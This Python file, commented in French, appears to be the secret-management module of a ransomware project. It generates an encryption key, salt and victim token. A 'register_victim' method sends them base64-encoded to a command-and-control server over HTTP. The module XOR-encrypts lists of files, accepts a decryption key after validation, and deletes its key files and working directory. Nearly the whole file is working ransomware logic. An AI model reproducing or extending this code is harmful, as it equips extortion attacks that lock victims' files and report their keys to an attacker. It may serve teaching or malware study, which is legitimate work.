from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import base64
import requests
import shutil

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from xorcrypt import xorfile

class SecretManager:
    # Définition des constantes pour la génération de secrets
    ITERATIONS = 48000
    TOKEN_SIZE = 16
    SALT_SIZE = 16
    KEY_SIZE = 16

    def __init__(self, remote_host_port: str = "127.0.0.1:6666", path: str = "/root") -> None:
        """
        Initialise les paramètres de connexion et les variables cryptographiques.
        """
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None
        self._logger = logging.getLogger(self.__class__.__name__)

    def derive_key(self, salt: bytes, key: bytes) -> bytes:
        """
        Génère une clé dérivée avec PBKDF2HMAC et SHA256.
        """
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_SIZE,
            salt=salt,
            iterations=self.ITERATIONS,
        )
        return kdf.derive(key)

    def generate_secrets(self) -> Tuple[bytes, bytes, bytes]:
        """
        Crée et renvoie le sel, la clé dérivée, et le token pour le chiffrement.
        """
        salt = secrets.token_bytes(self.SALT_SIZE)
        key = secrets.token_bytes(self.KEY_SIZE)
        derived_key = self.derive_key(salt, key)
        token = secrets.token_bytes(self.TOKEN_SIZE)

        self._salt = salt
        self._key = derived_key
        self._token = token

        # Sauvegarde la clé localement
        with open(os.path.join(self._path, "key.bin"), "wb") as key_file:
            key_file.write(self._key)

        return salt, derived_key, token

    def encode_to_base64(self, data: bytes) -> str:
        """
        Encode les données en base64 pour transmission.
        """
        return base64.b64encode(data).decode("utf8")

    def register_victim(self, salt: bytes, key: bytes, token: bytes) -> None:
        """
        Enregistre la victime sur le CNC en envoyant les informations encodées en base64.
        """
        payload = {
            "token": self.encode_to_base64(token),
            "salt": self.encode_to_base64(salt),
            "key": self.encode_to_base64(key),
        }
        url = f"http://{self._remote_host_port}/new"
        response = requests.post(url, json=payload)

        if response.status_code == 200:
            self._logger.info("Données envoyées au CNC avec succès.")
        else:
            self._logger.error(f"Échec de l'envoi des données : {response.status_code}")

    def setup(self) -> None:
        """
        Configure les secrets cryptographiques et enregistre les fichiers nécessaires localement et sur le CNC.
        """
        salt, key, token = self.generate_secrets()
        if self._key is None:
            self._logger.error("Erreur de génération de la clé lors de la configuration.")
            return

        os.makedirs(self._path, exist_ok=True)

        # Sauvegarde des fichiers token et sel
        with open(os.path.join(self._path, "token.bin"), "wb") as token_file:
            token_file.write(token)
            self._logger.info(f"Token sauvegardé dans {self._path}.")

        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_file:
            salt_file.write(salt)
            self._logger.info(f"Sel sauvegardé dans {self._path}.")

        self.register_victim(salt, key, token)

    def load_secrets(self) -> None:
        """
        Charge les secrets nécessaires (token, sel et clé) depuis les fichiers locaux.
        """
        paths = {
            "token": os.path.join(self._path, "token.bin"),
            "salt": os.path.join(self._path, "salt.bin"),
            "key": os.path.join(self._path, "key.bin"),
        }

        for attr, path in paths.items():
            if os.path.exists(path):
                with open(path, "rb") as file:
                    setattr(self, f"_{attr}", file.read())
                    self._logger.info(f"{attr.capitalize()} chargé depuis {path}.")
            else:
                self._logger.error(f"Fichier {attr} non trouvé : {path}")

    def validate_key(self, candidate_key: bytes) -> bool:
        """
        Valide la clé en comparant la clé dérivée avec celle initialement générée.
        """
        derived_key = self.derive_key(self._salt, candidate_key)
        return derived_key == self._key

    def set_decryption_key(self, key_in_base64: str) -> None:
        """
        Définit la clé de déchiffrement après validation.
        """
        try:
            candidate_key = base64.b64decode(key_in_base64)
            if self.validate_key(candidate_key):
                self._key = candidate_key
                self._logger.info("Clé de déchiffrement validée.")
            else:
                raise ValueError("Clé de déchiffrement invalide.")
        except base64.binascii.Error as e:
            raise ValueError(f"Erreur de décodage base64 : {e}")

    def get_token_in_hex(self) -> str:
        """
        Retourne le token en format hexadécimal après hachage SHA256.
        """
        return sha256(self._token).hexdigest() if self._token else ""

    def xor_encrypt_files(self, files: List[str]) -> None:
        """
        Chiffre une liste de fichiers avec la clé générée.
        """
        if self._key is None or not files:
            self._logger.error("Clé non définie ou liste de fichiers vide.")
            return

        for filepath in files:
            if os.path.exists(filepath):
                try:
                    xorfile(filepath, self._key)
                    self._logger.info(f"Fichier {filepath} chiffré avec succès.")
                except Exception as e:
                    self._logger.error(f"Erreur lors du chiffrement du fichier {filepath} : {e}")
            else:
                self._logger.warning(f"Fichier introuvable : {filepath}")

    def clear_data(self) -> None:
        """
        Supprime les fichiers contenant les données cryptographiques de la cible.
        """
        for filename in ["salt.bin", "token.bin", "key.bin"]:
            filepath = os.path.join(self._path, filename)
            if os.path.exists(filepath):
                os.remove(filepath)
                self._logger.info(f"Fichier supprimé : {filepath}")
            else:
                self._logger.warning(f"Fichier {filename} introuvable.")

        if os.path.exists(self._path):
            shutil.rmtree(self._path)
            self._logger.info(f"Répertoire supprimé : {self._path}")
